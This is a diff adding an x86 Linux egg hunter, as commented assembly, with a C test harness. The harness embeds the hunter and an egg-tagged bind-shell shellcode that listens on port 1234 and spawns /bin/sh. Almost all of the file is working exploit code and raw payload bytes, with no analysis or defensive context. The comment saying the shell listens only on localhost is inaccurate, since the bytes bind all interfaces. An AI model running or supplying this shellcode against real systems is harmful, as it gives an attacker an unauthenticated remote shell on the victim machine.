@@ -1,1 +1,66 @@
+ASSEMBLY CODE:
 
+;Author: Will Summerhill
+;Egg hunter code 
+
+global _start
+
+section .text
+_start:
+
+entry:
+	or cx, 0xfff
+next:
+	inc ecx 			      ;page counter
+	push byte +0x43		  ;sigaction system call
+	pop eax 			      ;store sigaction syscall into EAX
+	int 0x80			      ;execute sigaction
+	cmp al, 0xf2		    ;check if there was a segFault (if AL = 0xf2)
+	jz entry			      ;jump if zero flag (ZF) set from above cmp
+	mov eax, 0x99999999	;store egg into EAX
+	mov edi, ecx 		    ;move into EDI to validate address
+	
+	;EAX is egg, EDI is next address to validate
+	scasd				        ;scan string by comparing EAX and EDI, increment EDI by 4 
+	jnz next			      ;jump if zero flag (ZF) is not set from above compare
+	
+	scasd				        ;will execute when first bytes of egg matched, compare the second half
+	jnz next			      ;match failed - try again from next address
+	jmp edi 			      ;egg found - jump to payload in EDI
+  
+  
+  ======================================================================================================================
+  C PROGRAM EXECUTION CODE:
+  
+#include<stdio.h>
+#include<string.h>
+
+//extracted egg hunter shellcode
+unsigned char egghunter[] = \
+"\x66\x81\xc9\xff\x0f"       	//or     cx,0xfff
+"\x41"                   	    //inc    ecx
+"\x6a\x43"                	  //push   0x43
+"\x58"                   	    //pop    eax
+"\xcd\x80"                	  //int    0x80
+"\x3c\xf2"                	  //cmp    al,0xf2
+"\x74\xf1"                	  //je     80480a0 <_start>
+"\xb8\x99\x99\x99\x99"        //mov    eax,0x99999999 --> EGG
+"\x89\xcf"                	  //mov    edi,ecx
+"\xaf"                   	    //scas   eax,DWORD PTR es:[edi]
+"\x75\xec"                	  //jne    80480a5 <next>
+"\xaf"                   	    //scas   eax,DWORD PTR es:[edi]
+"\x75\xe9"                	  //jne    80480a5 <next>
+"\xff\xe7"; 			            //jmp    edi
+
+//add egg twice to beginning of bind shellcode below - "\X99\X99\X99\X99" X 2
+//listens on localhost port 1234
+unsigned char code[] = \
+"\x99\x99\x99\x99\x99\x99\x99\x99\x31\xc0\xb0\x02\x31\xdb\xb3\x01\x31\xd2\x52\x53\x50\x31\xc9\x89\xe1\x31\xc0\xb0\x66\xcd\x80\x89\xc2\x31\xdb\x53\x66\x68\x04\xd2\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x31\xc0\xb0\x66\xb3\x02\x89\xe1\xcd\x80\x6a\x01\x52\x31\xc0\x31\xdb\xb0\x66\xb3\x04\x89\xe1\xcd\x80\x31\xc0\x31\xdb\x50\x50\x52\x89\xe1\xb0\x66\xb3\x05\xcd\x80\x89\xc2\x31\xc0\xb0\x3f\x89\xd3\x31\xc9\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\x41\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\x41\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80";
+
+main()
+{
+	printf("Shellcode Length with 8 byte egg:  %d\n", strlen(code));
+	printf("Egg hunter length: %d bytes\n", strlen(egghunter));
+	int (*ret)() = (int(*)())egghunter; //return egghunter
+	ret();
+}
